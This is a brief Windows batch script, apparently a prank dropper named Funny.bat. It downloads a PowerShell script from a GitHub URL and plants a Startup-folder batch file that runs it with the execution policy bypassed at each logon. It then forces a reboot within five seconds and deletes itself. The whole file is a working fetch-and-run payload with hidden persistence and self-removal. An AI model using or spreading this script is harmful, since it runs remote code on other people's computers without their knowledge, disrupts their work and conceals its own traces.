cd %homepath%
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Mouse/On Startup/Centre/Mouse.ps1' -OutFile .\Mouse.ps1
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo cd %%homepath%% > A.bat
echo powershell -ExecutionPolicy Bypass -File Mouse.ps1 >> A.bat
Shutdown /r /t 5
cd /D "%~dp0" 
del Funny.bat
